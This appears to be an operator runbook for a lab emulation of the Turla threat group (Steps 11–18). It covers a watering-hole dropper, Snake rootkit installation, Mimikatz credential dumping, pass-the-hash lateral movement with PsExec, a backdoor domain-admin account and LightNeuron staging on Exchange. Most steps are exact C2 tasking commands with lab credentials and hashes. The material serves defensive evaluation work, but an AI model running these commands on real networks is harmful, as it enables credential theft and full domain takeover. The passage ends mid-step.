# Scenario Overview

Legend of symbols:
* :bulb: - callout notes
* :heavy_exclamation_mark: - extremely important note
* :arrow_right: - Switching to another session
* :o: - Sign out of something

---

## Setup

:arrow_right: RDP, do not SSH, to the Kali attacker machine `(176.59.15.33)`.

* Open a new terminal window, cd to the cloned repo control server, and start the control server:

```bash
cd /opt/day2/turla/Resources/control_server
rm logs.txt
sudo ./controlServer -c ./config/turla_day2.yml
```

* Ensure the EPIC, Snake, and LightNeuron handlers started up.

## Step 11 - Initial Compromise and Establish Foothold

:microphone: `Voice Track:`

Step 11 emulates Turla gaining initial access via a watering hole attack 
targeting user `Egle`.

`Egle` visits a legitimate, but compromised website. This website redirects 
`Egle` to a duplicated, malicious version of the compromised website 
hosted on an adversary server containing javascript (JS) that fingerprints 
their machine in the background and installs an evercookie on their browser.

This malicious WordPress website prompts `Egle` with a notice to update their
NotFlash. `Egle` clicks to download the update, NFVersion_5e.exe, containing
EPIC (a.k.a. Tavdig/Wipbot).

The execution flow of EPIC follows the same execution flow of EPIC in the Carbon
scenario. The only difference with this scenario's version of EPIC is it
communicates over HTTPS instead.

Once C2 communications have been established between EPIC and the C2 via the 
proxy server, discovery is performed on the first host where information about
the host device and domain computers is collected.

---

### :biohazard: Procedures

:arrow_right: RDP to `Azuolas (10.100.40.103)` as `Egle`:

| Username   | Password |
| :--------: | :---------------: |
| nk\Egle  | Producer1! |

* Open Microsoft Edge and browse to `nato-int.com`. 

* Wait for redirection to `anto-int.com`.

* After redirection you will prompted to update NotFlash. Click to download the
update (`NFVersion_5e.exe`) bundled with EPIC (a.k.a. Tavdig/Wipbot).

* Once the download has been completed, click the downloaded binary to execute it.

* Wait 1 minute for it to finish running.

* Close out of all tabs and sign out of your RDP session.

* Re-RDP to `Azuolas (10.100.40.103)` as `Egle`:

| Username   | Password |
| :--------: | :---------------: |
| nk\Egle  | Producer1! |

* Open Microsoft Edge and browse to `https://drebule.nk.local/owa`. Log in as `Egle`:

| Username   | Password | 
| :--------: | :---------------: | 
| nk\Egle  | Producer1! |

:arrow_right: **Set a timer for 2 minutes** then switch to your Kali control server terminal and
confirm that a new implant has registered and the automated discovery output has been returned in
the server log.

**NOTE:** The injector will wait **2 minutes**, before injecting EPIC's Guard DLL into explorer.exe
and, subsequently, EPIC's worker DLL into Microsoft Edge. 

* Within the terminal window, split your terminal horizontally via right-click -> split terminal. Be careful not to accidentally terminate the control server.

* In your lower terminal tab, task the EPIC implant with the following set of discovery commands:

```bash
cd /opt/day2/turla/Resources/control_server
./evalsC2client.py --set-task 218780a0-870e-480e-b2c5dc 'exe | systeminfo && net group "Domain Computers" /domain'
```

### :moyai: Source Code

* Watering Hole
  * [Browser redirection](../../Resources/setup/files/watering_hole/redirection.py#L18-L31)
  * Browser evercookie (utilized built-in [BeEF Evercookie](https://github.com/beefproject/beef/blob/486a9bb329f46e434e40c8e8567afa2754b37517/core/main/client/session.js#L15-L16) from the Browser Exploitation Framework)
  * [Fingerprinting details](../../Resources/setup/files/watering_hole/README.md#fingerprinting-details-from-beef-via-evercookie-and-other-bundled-tools)
* [EPIC Dropper](../../Resources/EPIC/SimpleDropper)
  * [File write of EPIC injector](../../Resources/EPIC/SimpleDropper/SimpleDropper/Source.cpp#L34-L50)
  * [Registry modification](../../Resources/EPIC/SimpleDropper/SimpleDropper/Source.cpp#L95-L143)
* [EPIC Injector](../../Resources/EPIC/Defense-Evasion/reflective_injector/reflective_injector/)
  * Extract EPIC Guard DLL from resources section [FindResourceW](../../Resources/EPIC/Defense-Evasion/reflective_injector/reflective_injector/Source.cpp#L161-L193)
  * Targeting explorer.exe for [DLL injection](../../Resources/EPIC/Defense-Evasion/reflective_injector/reflective_injector/Source.cpp#L199-L233)
* [EPIC Guard](../../Resources/EPIC/Defense-Evasion/reflective-guard/reflective-guard/)
  * Extract EPIC payload DLL from resources section [FindResourceW](../../Resources/EPIC/Defense-Evasion/reflective-guard/reflective-guard/dllmain.cpp#L161-L193)
  * Targeting svchost.exe for payload [DLL injection](../../Resources/EPIC/Defense-Evasion/reflective-guard/reflective-guard/dllmain.cpp#L235-L283)
* [EPIC Payload](../../Resources/EPIC/payload/) (in msedge.exe)
  * Execute commands [ExecCmd](../../Resources/EPIC/payload/src/epic.cpp#L47-L71)
  * User discovery [GetAllUsers](../../Resources/EPIC/payload/src/epic.cpp#L111-L182)
  * Directory discovery [DirectoryDiscovery](../../Resources/EPIC/payload/src/epic.cpp#L257-L298)
  * Write results to log file [WriteResults](../../Resources/EPIC/payload/src/epic.cpp#L311-L345)
  * C2 communications are:
    * [bzip2 compressed](../../Resources/EPIC/payload/src/comms.cpp#L462-L469)
    * [AES encrypted](../../Resources/EPIC/payload/src/comms.cpp#L483-L484)
    * [RSA encrypted AES key](../../Resources/EPIC/payload/src/comms.cpp#L487-L497)
    * [base64 encoded](../../Resources/EPIC/payload/src/comms.cpp#L505)
  * C2 communications are over [HTTPS](../../Resources/EPIC/payload/src/comms.cpp#L422-L459), [HTTPS specific flags](../../Resources/EPIC/payload/src/comms.cpp#L371-L379)

### :microscope: Cited Intelligence

* <https://securelist.com/analysis/publications/65545/the-epic-turla-operation/>
* <https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/waterbug-attack-group.pdf>
* <https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf>
* <https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Visiting-The-Snake-Nest.pdf>
* <https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf>
* <https://docs.broadcom.com/doc/waterbug-attack-group>
* <https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/>
* <https://www.welivesecurity.com/2017/06/06/turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/>
* <https://github.com/samyk/evercookie>


## Step 12 - Rootkit Installation

:microphone: `Voice Track:`

Step 12 emulates Turla exploiting a vulnerable driver to install the Snake rootkit 
on the `Azuolas (10.100.40.103)` system.

The existing EPIC implant, running under the context of `Egle`, will be used to download 
the Snake installer to the local machine and execute the installer as second stage 
malware. The Snake installer will escalate privileges to SYSTEM by exploiting a Windows 10 vulnerability.
Once running as SYSTEM, the installer will disable DSE by loading and exploiting a vulnerable driver.
Once DSE is disabled, the installer will load the Snake rootkit driver.

The rootkit driver will hook various functions and will inject a user-mode DLL into a SYSTEM process 
to execute received tasks from the C2 server. The driver will then wait for a browser process to make a network request
to inject the user-mode DLL into the browser for C2 communications over HTTP. The injected DLLs will communicate between each
other via named pipes.

At some point, `Egle` will browse to a website, triggering the rootkit driver to 
inject the user-mode DLL into the browser process - this DLL will begin communication with the C2 server
over HTTP.

---

### :biohazard: Procedures

* In your Kali C2 server, ensure that you are in the lower split terminal window.

* Task the EPIC implant to download the Snake rootkit installer.

```bash
./evalsC2client.py --set-task 218780a0-870e-480e-b2c5dc 'name | C:\\Users\\Egle\\Desktop\\gusbsys.exe | snake.exe'
```

* Wait 1 minute after the payload is sucessfully downloaded before tasking the implant to execute the Snake rootkit installer with the privilege escalation option:

```bash
./evalsC2client.py --set-task 218780a0-870e-480e-b2c5dc 'exe | C:\\Users\\Egle\\Desktop\\gusbsys.exe -f'
```

* :arrow_right: Switch to your RDP session in `azuolas (10.100.40.103)` and go to your Edge window. Perform a hard refresh on the current page by pressing Ctrl+Shift+R.

:arrow_right: Return to your Kali C2 server terminal window and verify that a new implant session is beaconing back to the C2 server. 

### :moyai: Source Code

* EPIC
  * File download [DownloadFile](../../Resources/EPIC/payload/src/epic.cpp#L441-L466)
  * Execute commands [ExecCmd](../../Resources/EPIC/payload/src/epic.cpp#L47-L71)
* [Snake Installer](../../Resources/Snake/SnakeInstaller/README.md)
  * [Privilege Escalation](../../Resources/Snake/SnakeInstaller/src/privesc/privesc.cpp#L180)
  * [Disable DSE and Load Rootkit](../../Resources/Snake/SnakeInstaller/src/main.cpp#L63)
  * [Start Snake Rootkit Driver](../../Resources/Snake/SnakeInstaller/src/driver/driver.cpp#L111)
* [Snake Rootkit](../../Resources/Snake/README.md)
  * [Driver](../../Resources/Snake/SnakeDriver/SnakeDriver/driver.c#L76)
  * [Function Hooking](../../Resources/Snake/SnakeDriver/SnakeDriver/hooks.c#L31)
    * [Infinity Hook](../../Resources/Snake/SnakeDriver/libinfinityhook/README.md)
  * [Drop DLL](../../Resources/Snake/SnakeDriver/SnakeDriver/filesystem.cpp#L22)
  * [Trigger injection on network request](../../Resources/Snake/SnakeDriver/SnakeDriver/wfp.cpp#L276)
  * [Inject Usermodule DLL](../../Resources/Snake/SnakeDriver/SnakeDriver/inject.cpp#L30)
* [Snake Usermodule DLL](../../Resources/Snake/UserModule/README.md)
  * [C2 communications over HTTP](../../Resources/Snake/UserModule/src/comms_http.cpp#L237)

### :microscope: Cited Intelligence

* [Report 9: Securelist/Artemon- Uroburos](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2014/08/20082358/uroburos.pdf)
* [Report 10: BAE/Artemon- Snake](https://artemonsecurity.com/snake_whitepaper.pdf)
* [Report 11: GData- Uroburos](https://public.gdatasoftware.com/Web/Content/INT/Blog/2014/02_2014/documents/GData_Uroburos_RedPaper_EN_v1.pdf)
* [Report 12: CIRCL- TR-25](https://www.circl.lu/pub/tr-25/)
* [Report 13: GData- Kernel Protection Mitigation](https://www.gdatasoftware.com/blog/2014/03/23966-uroburos-deeper-travel-into-kernel-protection-mitigation)
* [Report 14: GData- using WinDbg](https://www.gdatasoftware.com/blog/2014/06/23953-analysis-of-uroburos-using-windbg)
* [Report 16: GData- Project Cobra](https://www.gdatasoftware.com/blog/2015/01/23926-analysis-of-project-cobra)
* [Report 17: Tetrane- Uroburos with REVEN](https://blog.tetrane.com/2019/Analysis-Uroburos-Malware-REVEN.html)
* [Report 18: Talos- Snake Campaign](https://blog.talosintelligence.com/2014/04/snake-campaign-few-words-about-uroburos.html)
* [Report 19: Lastline- Dissecting Turla Rootkit](https://www.lastline.com/labsblog/dissecting-turla-rootkit-malware-using-dynamic-analysis/)
* [Report 20: Lastline- Kernel Exploit Makeover](https://www.lastline.com/labsblog/turla-apt-group-gives-their-kernel-exploit-a-makeover/)
* [Report 27: GitHub- hfiref0x/TDL](https://github.com/hfiref0x/TDL)
* [Report 28: CoreLabs- VirtualBox Privilege Escalation](https://www.coresecurity.com/core-labs/advisories/virtualbox-privilege-escalation-vulnerability)
* [Report 29: Unit42- Acidbox](https://unit42.paloaltonetworks.com/acidbox-rare-malware/)

## Step 13 - First Workstation Discovery

:microphone: `Voice Track:`

Step 13 emulates Turla performing discovery on the first workstation to
discover a file server and associated file server admin.

The Snake rootkit receives tasking from the C2 server to enumerate currently
running processes on the local computer and finds that `EgleAdmin` also has
processes running. Further enumeration of the `EgleAdmin` user shows that it is
a member of the `File Server Admins` group. Snake then impersonates `Egle` to
enumerate mapped drives on the local machine and discovers `Egle`'s home drive
is actively mapped to the file server.

---

### :biohazard: Procedures

* :arrow_right: Return to your RDP session to `azuolas (10.100.40.103)` as `Egle`. 

* Open up a powershell terminal and run the following command:

```pwsh
runas /user:nk\egleadmin powershell
```

* When prompted, type in the password for `EgleAdmin`:

| Username   | Password |
| :--------: | :---------------: |
| nk\EgleAdmin | Producer1! |

* A new powershell window should pop up. Run the following command to ensure that you are running as `nk\EgleAdmin`:

```pwsh
whoami
```

* :arrow_right: Return to your Kali C2 server.

* From your lower Kali C2 terminal window, task the Snake rootkit to run the following process discovery command:
```bash
# Discover running processes
./evalsC2client.py --set-task 534b40585d514b554844 '{"type": 3, "proc": "tasklist.exe", "args": "/v"}'
```

* :heavy_exclamation_mark: Verify that the enumerated processes output contains a process running under `EgleAdmin`
```bash
grep 'NK\\EgleAdmin' logs.txt -i
```

* This should return output similar to the following:
  * > ```
    > powershell.exe                2868 RDP-Tcp#6                  5     79,140 K Unknown         NK\egleadmin                                            0:00:00 N/A
    > conhost.exe                   7368 RDP-Tcp#6                  5     18,088 K Unknown         NK\egleadmin                                            0:00:00 N/A
    > ```

* Wait 1 minute then execute the next discovery command to enumerate `EgleAdmin`'s groups:
```bash
# Enumerate details on EgleAdmin to find group membership
./evalsC2client.py --set-task 534b40585d514b554844 '{"type": 3, "proc": "net.exe", "args": "user /domain EgleAdmin"}'
```
:heavy_exclamation_mark: Verify that `File Server Admins` is listed as one of the groups that `EgleAdmin` is a member of.

* Wait 1 minute then execute the next discovery command to the drive mapped to the file server:
```bash
# Discover that the local machine has a drive mapped to the file server
./evalsC2client.py --set-task 534b40585d514b554844 '{"type": 3, "proc": "net.exe", "args": "use", "runas": "nk\\Egle"}'
```
:heavy_exclamation_mark: Verify that the home drive is mapped to the file server host `berzas` (`10.100.30.204`).

### :moyai: Source Code

* [Snake Usermodule DLL](../../Resources/Snake/UserModule/README.md)
  * [Task download](../../Resources/Snake/UserModule/src/comms_http.cpp#L237)
  * [Task execution with optional token impersonation](../../Resources/Snake/UserModule/src/execute.cpp#L406)
  * [Token duplication](../../Resources/Snake/UserModule/src/execute_token.cpp#L284)

### :microscope: Cited Intelligence
* <https://artemonsecurity.com/snake_whitepaper.pdf>

## Step 14 - Lateral Movement to File Server

:microphone: `Voice Track:`

Step 14 emulates Turla using the discovered admin account to laterally move to the file server and install the Snake rootkit on it.

Using the information discovered in the previous step, Snake impersonates the EgleAdmin account to run PsExec and execute another copy of the Snake rootkit installer on the file server. This new copy of the Snake installer will have the installed rootkit beacon back to the C2 server via a different redirector.

---

### :biohazard: Procedures

* Tasking the implant to download PsExec.
```bash
./evalsC2client.py --set-task 534b40585d514b554844 '{"type": 4, "file": "PsExec.exe", "dest":"C:\\Windows\\System32\\file_svc_mgr.exe"}'
```

* Wait 1 minute and then run the following command to download the snake installer:
```bash
./evalsC2client.py --set-task 534b40585d514b554844 '{"type": 4, "file": "installer_v2.exe", "dest":"C:\\Windows\\System32\\cmu_svc_v2.exe"}'
```

* Wait 1 minute before running the following command to execute PsExec as `EgleAdmin`, which will run the Snake installer on the file server `berzas (10.100.30.204)`:
```bash
./evalsC2client.py --set-task 534b40585d514b554844 '{"type": 3, "proc": "C:\\Windows\\System32\\file_svc_mgr.exe", "args":"\\\\berzas -accepteula -s -c C:\\Windows\\System32\\cmu_svc_v2.exe", "runas":"nk\\EgleAdmin"}'
```

:arrow_right: Go back to your RDP session to `Azuolas (10.100.40.103)` as `Egle`.

* Minimize the RDP window.

:arrow_right: RDP into `berzas` (`10.100.30.204`) as `EgleAdmin`:

| Username   | Password | 
| :--------: | :---------------: | 
| nk\EgleAdmin  | Producer1! |

* Close any spurious windows

* Open Edge and navigate to <https://www.google.com>. Perform a search on `File server configuration best practices`, but don't click on any results.

* Minimize the RDP window, keeping processes running.

:arrow_right: Check the Kali C2 server terminal window and verify that a new implant session is beaconing back to the C2 server. 

* Wait 1 minute before running the following command to remove files from `Azuolas (10.100.40.103)`:
```bash
./evalsC2client.py --set-task 534b40585d514b554844 '{"type": 1, "command": "del /Q C:\\Windows\\System32\\file_svc_mgr.exe C:\\Windows\\System32\\cmu_svc_v2.exe"}'
```

### :moyai: Source Code
* [Snake Installer](../../Resources/Snake/SnakeInstaller/README.md)
  * [Privilege Escalation](../../Resources/Snake/SnakeInstaller/src/privesc/privesc.cpp#L180)
  * [Disable DSE and Load Rootkit](../../Resources/Snake/SnakeInstaller/src/main.cpp#L63)
  * [Start Snake Rootkit Driver](../../Resources/Snake/SnakeInstaller/src/driver/driver.cpp#L111)
* [Snake Rootkit](../../Resources/Snake/README.md)
  * [Driver](../../Resources/Snake/SnakeDriver/SnakeDriver/driver.c#L76)
  * [Function Hooking](../../Resources/Snake/SnakeDriver/SnakeDriver/hooks.c#L31)
    * [Infinity Hook](../../Resources/Snake/SnakeDriver/libinfinityhook/README.md)
  * [Drop DLL](../../Resources/Snake/SnakeDriver/SnakeDriver/filesystem.cpp#L22)
  * [Trigger injection on network request](../../Resources/Snake/SnakeDriver/SnakeDriver/wfp.cpp#L276)
  * [Inject Usermodule DLL](../../Resources/Snake/SnakeDriver/SnakeDriver/inject.cpp#L30)
* [Snake Usermodule DLL](../../Resources/Snake/UserModule/README.md)
  * [Task download](../../Resources/Snake/UserModule/src/comms_http.cpp#L237)
  * [Task execution via cmd](../../Resources/Snake/UserModule/src/execute.cpp#L337)
  * [Generic process execution with optional token impersonation](../../Resources/Snake/UserModule/src/execute.cpp#L406)
  * [Payload download](../../Resources/Snake/UserModule/src/comms_http.cpp#L604)
  * [Token duplication](../../Resources/Snake/UserModule/src/execute_token.cpp#L284)

### :microscope: Cited Intelligence

* <https://artemonsecurity.com/snake_whitepaper.pdf>

## Step 15 - Domain Discovery

:microphone: `Voice Track:`

Step 15 emulates Turla using Powershell to perform Active Directory user, group, and computer discovery. 

The Snake rootkit receives tasking from the C2 server to use Powershell's `ActiveDirectory` module to enumerate domain users, admin groups, and computers. Upon discovering `Zilvinas`'s regular and domain admin accounts, Snake will enumerate further details on the accounts. Snake then
discovers a workstation belonging to `Zilvinas` to use as a future lateral movement target.

---

### :biohazard: Procedures

* From your lower Kali C2 control server terminal window, task Snake to check if the `ActiveDirectory` PowerShell module is installed.
```bash
./evalsC2client.py --set-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Get-Module -ListAvailable -Name ActiveDirectory"}'
```
:heavy_exclamation_mark: Verify that you see output. If the implant returns empty output, please contact your lead.

* Wait 1 minute before tasking Snake to collect a list of Active Directory groups containing the word "management", 
as members of these groups will likely have elevated permissions on the network.
```bash
./evalsC2client.py --set-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADGroup -Filter * | Where-Object Name -Match \"management\" | Select Name"}'
```
:heavy_exclamation_mark: Verify that `Server Management` is included in the results.

* Wait 1 minute before tasking Snake to obtain the usernames of accounts within the `Server Management` domain group. This will instruct Turla on users to target next.

```bash
./evalsC2client.py --set-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADGroupMember -Identity \"Server Management\" | Select Name,SamAccountName"}'
```
:heavy_exclamation_mark: Verify that `ZilvinasAdmin`shows up in the list of accounts.

* Wait 1 minute before tasking Snake to obtain the usernames of accounts within the `Domain Admins` domain group.
```bash
./evalsC2client.py --set-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADGroupMember -Identity \"Domain Admins\" | Select Name,SamAccountName"}'
```
:heavy_exclamation_mark: Verify that `ZilvinasAdmin`shows up in the list of accounts.

* Wait 1 minute before tasking Snake to discover domain users. Ensure
`Zilvinas` and `ZilvinasAdmin` appear in the output.
```bash
./evalsC2client.py --set-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADUser -Filter {LastLogonDate -ne 0} -Properties * | Select Name,SamAccountName"}'
```

* Finally, wait 1 minute before tasking Snake to obtain a list of domain computers and some of their information (IP addresses, DNS names, and description).
```bash
./evalsC2client.py --set-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADComputer -Filter * -Properties * | Select Name,DnsName,IPv4Address,Description"}'
```
:heavy_exclamation_mark: Ensure that `Zilvinas' Workstation` appears in the `Description` field for `uosis`

### :moyai: Source Code

* [Snake Usermodule DLL](../../Resources/Snake/UserModule/README.md)
  * [Task download](../../Resources/Snake/UserModule/src/comms_http.cpp#L237)
  * [Powershell execution](../../Resources/Snake/UserModule/src/execute.cpp#L372)

### :microscope: Cited Intelligence

* TBD

## Step 16 - Preparation for Lateral Movement to Admin Workstation

:microphone: `Voice Track:`

Step 16 emulates Turla performing credential dumping on the file server with the goal of moving laterally to a workstation owned by a Domain Admin.

Snake downloads Mimikatz to the file server and extracts all NTLM hashes on the target. The command output is sent directly to the C2 server.

---

### :biohazard: Procedures

* From the Kali C2 server lower terminal window, task Snake to download Mimikatz to the file server:
```bash
./evalsC2client.py --set-task 5054474d50435a51404b '{"type": 4, "file": "mimikatz.exe", "dest": "C:\\Windows\\System32\\loadperf.exe"}'
```

* Wait 1 minute and then instruct Snake to download PsExec to the file server:

```bash
./evalsC2client.py --set-task 5054474d50435a51404b '{"type": 4, "file": "PsExec.exe", "dest": "C:\\Windows\\System32\\fs_mgr.exe"}'
```

* Wait 1 minute and then run the following command to download the snake installer:

```bash
./evalsC2client.py --set-task 5054474d50435a51404b '{"type": 4, "file": "installer_v3.exe", "dest":"C:\\Windows\\System32\\cmu_svc.exe"}'
```

* Wait 1 minute and then instruct Snake to run Mimikatz to dump all NTLM hashes from `LSASS.exe`:

```bash
./evalsC2client.py --set-task 5054474d50435a51404b '{"type": 3, "proc": "C:\\Windows\\System32\\loadperf.exe", "args": "\"pr::d\" \"slsa::lop\" \"quit\""}'
```

* :heavy_exclamation_mark: Verify that the password `Producer2!` and NTLM hash
`f3fcd61f987a97da49ce5f650b4e6539` for `ZilvinasAdmin` appears at least once in
the output.

```bash
grep '* Username : ZilvinasAdmin' logs.txt -C 5 -i
```

* This should return:
  * > ```
    >     * Username : ZilvinasAdmin
    >     * Domain   : NK
    >     * NTLM     : f3fcd61f987a97da49ce5f650b4e6539
    >     * SHA1     : fc8c801521140666c793108b67716caf4c4189f4
    >     * DPAPI    : b06d7bea8849897b811e1d73ab22726c
    >     tsPkG :	
    > --
    >     * Username : ZilvinasAdmin
    >     * Domain   : NK
    >     * Password : Producer2!
    >     kErberoS :	
    >     * Username : ZilvinasAdmin
    >     * Domain   : NK.LOCAL
    >     * Password : (null)
    >     sSp :	
    >     crEdMan :
    > ```

### :moyai: Source Code

* [Snake Usermodule DLL](../../Resources/Snake/UserModule/README.md)
  * [Payload download](../../Resources/Snake/UserModule/src/comms_http.cpp#L604)
  * [Generic process execution](../../Resources/Snake/UserModule/src/execute.cpp#L406)
* [Mimikatz](../../Resources/Mimikatz)

### :microscope: Cited Intelligence

* TBD

## Step 17 - Lateral Movement to Admin Workstation and Persistence

:microphone: `Voice Track:`

Step 17 emulates Turla performing lateral movement to the domain admin's workstation and performing additional persistence by creating a new domain admin account.

The retrieved NTLM hash discovered in the previous step is used in a pass-the-hash attack to move laterally to `Zilvinas`'s workstation. PsExec is used via pass-the-hash to execute and install the Snake rootkit on the target workstation.

Once the admin workstation has been compromised, Snake is used to enumerate processes running on `Zilvinas`'s workstation `uosis`, where it is discovered that `ZilvinasAdmin` has processes running which can be used for token impersonation. By impersonating `ZilvinasAdmin`, a new domain user `Leshy` is created and added to the `Domain Admins` domain group for persistence.

---

### :biohazard: Procedures

* Instruct Snake to pass-the-hash using `ZilvinasAdmin`'s NTLM hash to run PsExec and install Snake on the target workstation.
```bash
./evalsC2client.py --set-task 5054474d50435a51404b '{"type": 3, "proc": "C:\\Windows\\System32\\loadperf.exe", "args": "\"privilege::debug\" \"sekurlsa::pth /user:ZilvinasAdmin /ntlm:f3fcd61f987a97da49ce5f650b4e6539 /domain:nk.local /remotepc:uosis /pexe:C:\\Windows\\System32\\fs_mgr.exe /sys:1 /prun:C:\\Windows\\System32\\cmu_svc.exe\" \"quit\""}'
```

:arrow_right: Wait 2 minutes. Start a new RDP session to `uosis` (`10.100.40.102`) as `Zilvinas`:

| Username   | Password |
| :--------: | :---------------: |
| nk\Zilvinas  | Producer2! |

* Open Edge and navigate to `https://drebule.nk.local/owa`. Log in as `Zilvinas`:

| Username   | Password |
| :--------: | :---------------: |
| nk\Zilvinas  | Producer2! |

* Spend a couple minutes reading through any unread emails to wait for the implant to start beaconing back to the C2 server.

:arrow_right: Return to the Kali C2 terminal window and verify that a new implant session is beaconing back to the C2 server.

* Wait 1 minute and then task the implant to delete artifacts from the file server.
```bash
./evalsC2client.py --set-task 5054474d50435a51404b '{"type": 1, "command": "del /Q C:\\Windows\\System32\\fs_mgr.exe C:\\Windows\\System32\\loadperf.exe C:\\Windows\\System32\\cmu_svc.exe"}'
```

* :arrow_right: Return to your RDP session to `uosis (10.100.40.102)` as `Zilvinas`. 

* Click on the search bar and search for `powershell`. Right click `powershell` and then click "Run as Administrator".

* When prompted, type in the username and password for `ZilvinasAdmin`:

| Username   | Password |
| :--------: | :---------------: |
| nk\ZilvinasAdmin | Producer2! |

* A new powershell window should pop up. Run the following command to ensure that you are running as `nk\ZilvinasAdmin`:
```pwsh
whoami
```

:arrow_right: Return to the Kali C2 server

* From the lower terminal window, task Snake to enumerate running processes on the machine to discover processes under `ZilvinasAdmin`.
```bash
./evalsC2client.py --set-task 475e465e424557475b42 '{"type": 3, "proc": "tasklist.exe", "args": "/v"}'
```

* :heavy_exclamation_mark: Verify that we find processes running under `ZilvinasAdmin`

```bash
grep 'NK\\ZilvinasAdmin' logs.txt -i 
```

* This should return output similar to the following:
  * > ```
    > powershell.exe                8152 RDP-Tcp#2                  3     83,280 K Unknown         NK\ZilvinasAdmin                                        0:00:00 N/A
    > conhost.exe                    312 RDP-Tcp#2                  3     17,356 K Unknown         NK\ZilvinasAdmin                                        0:00:00 N/A
    > ```

* Wait 1 minute, then instruct Snake to create a new domain user `Leshy` using an access token from one of the `ZilvinasAdmin` processes. `Leshy` will be used as a backdoor domain admin account for persistence on the domain.
```bash
./evalsC2client.py --set-task 475e465e424557475b42 '{"type": 1, "command": "net user leshy Password12345 /add /domain", "runas": "nk\\zilvinasadmin"}'
```

* Wait 1 minute, then instruct Snake to add `Leshy` to the `Domain Admins` group.
```bash
./evalsC2client.py --set-task 475e465e424557475b42 '{"type": 1, "command": "net group \"Domain Admins\" leshy /add /domain", "runas": "nk\\zilvinasadmin"}'
```

### :moyai: Source Code
* [Snake Installer](../../Resources/Snake/SnakeInstaller/README.md)
  * [Privilege Escalation](../../Resources/Snake/SnakeInstaller/src/privesc/privesc.cpp#L180)
  * [Disable DSE and Load Rootkit](../../Resources/Snake/SnakeInstaller/src/main.cpp#L63)
  * [Start Snake Rootkit Driver](../../Resources/Snake/SnakeInstaller/src/driver/driver.cpp#L111)
* [Snake Rootkit](../../Resources/Snake/README.md)
  * [Driver](../../Resources/Snake/SnakeDriver/SnakeDriver/driver.c#L76)
  * [Function Hooking](../../Resources/Snake/SnakeDriver/SnakeDriver/hooks.c#L31)
    * [Infinity Hook](../../Resources/Snake/SnakeDriver/libinfinityhook/README.md)
  * [Drop DLL](../../Resources/Snake/SnakeDriver/SnakeDriver/filesystem.cpp#L22)
  * [Trigger injection on network request](../../Resources/Snake/SnakeDriver/SnakeDriver/wfp.cpp#L276)
  * [Inject Usermodule DLL](../../Resources/Snake/SnakeDriver/SnakeDriver/inject.cpp#L30)
* [Snake Usermodule DLL](../../Resources/Snake/UserModule/README.md)
  * [C2 communications over HTTP](../../Resources/Snake/UserModule/src/comms_http.cpp#L237)
  * [Task download](../../Resources/Snake/UserModule/src/comms_http.cpp#L237)
  * [Task execution for generic process](../../Resources/Snake/UserModule/src/execute.cpp#L406)
  * [Task execution via cmd with optional token impersonation](../../Resources/Snake/UserModule/src/execute.cpp#L337)
  * [Token duplication](../../Resources/Snake/UserModule/src/execute_token.cpp#L284)
  * [Payload download](../../Resources/Snake/UserModule/src/comms_http.cpp#L604)
  * [File Upload](../../Resources/Snake/UserModule/src/comms_http.cpp#L359)

### :microscope: Cited Intelligence

* TBD

## Step 18 - Lateral Movement to Exchange Server

:microphone: `Voice Track:`

Step 18 emulates Turla laterally moving to the Exchange server and installing the LightNeuron implant there.

Snake downloads LightNeuron and associated Powershell installation script and config files, transfers them to the Exchange server, and remotely executes the installation script using WMI to install LightNeuron on the Exchange server.

---

### :biohazard: Procedures

* From the Kali C2 lower terminal window, task Snake to download LightNeuron:
```bash
./evalsC2client.py --set-task 475e465e424557475b42 '{"type": 4, "file": "ln_transport_agent.dll", "dest":"C:\\Windows\\System32\\mtxconf.dll"}'
```

* Wait 1 minute and then task Snake to download the companion DLL for LightNeuron:
```bash
./evalsC2client.py --set-task 475e465e424557475b42 '{"type": 4, "file": "n_installer_aux.dll", "dest":"C:\\Windows\\System32\\mtxcli.dll"}'
```

* Wait 1 minute and then task Snake to download the Powershell installation script for LightNeuron.
```bash
./evalsC2client.py --set-task 475e465e424557475b42 '{"type": 4, "file": "msiex.ps1", "dest":"C:\\Windows\\System32\\msiex.ps1"}'
```

* Wait 1 minute and then task Snake to download the LightNeuron email rules file.
```bash
./evalsC2client.py --set-task 475e465e424557475b42 '{"type": 4, "file": "rules.xml", "dest":"C:\\Windows\\System32\\wdr.rules.xml"}'
```

* Wait 1 minute and then task Snake to download the LightNeuron config file.
```bash
./evalsC2client.py --set-task 475e465e424557475b42 '{"type": 4, "file": "winmail.dat", "dest":"C:\\Windows\\System32\\perfe009.dat"}'
```

* Wait 1 minute and then task Snake to copy LightNeuron, the rules config file, and the Powershell installation script to the remote target `drebule`, using token impersonation to perform the copy as `ZilvinasAdmin`.
```bash
# Copy LightNeuron
./evalsC2client.py --set-task 475e465e424557475b42 '{"type": 1, "command": "copy C:\\Windows\\System32\\mtxconf.dll \"\\\\drebule\\C$\\Program Files\\Microsoft\\Exchange Server\\V15\\TransportRoles\\agents\\Hygiene\\Microsoft.Exchange.Transport.Agent.ConnectionFiltering.dll\"", "runas": "nk\\zilvinasadmin"}'
```

* Wait 1 minute before copying the next file:

```bash
# Copy LightNeuron companion DLL
./evalsC2client.py --set-task 475e465e424557475b42 '{"type": 1, "command": "copy C:\\Windows\\System32\\mtxcli.dll \"\\\\drebule\\C$\\Program Files\\Microsoft\\Exchange Server\\v15\\bin\\exdbdata.dll\"", "runas": "nk\\zilvinasadmin"}'
```

* Wait 1 minute before copying the next file:

```bash
# Copy installation script
